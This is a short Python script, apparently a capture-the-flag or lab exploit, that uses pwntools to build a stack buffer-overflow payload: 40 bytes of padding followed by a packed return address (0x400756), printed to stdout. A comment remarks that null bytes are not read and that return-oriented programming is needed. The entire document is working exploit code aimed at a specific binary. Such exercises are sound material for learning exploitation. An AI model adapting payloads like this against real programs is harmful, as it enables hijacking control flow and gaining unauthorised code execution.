#!/usr/bin/python3
# coding: utf-8

from pwn import *
import sys

"""
Null bytes (\x00) aren't read. 
We need ROP !

"""

buf  = b'A' * 40 #padding
buf += p64(0x0400756)
#buf += b'\x56\x07\x40\x00' 

sys.stdout.buffer.write(buf)
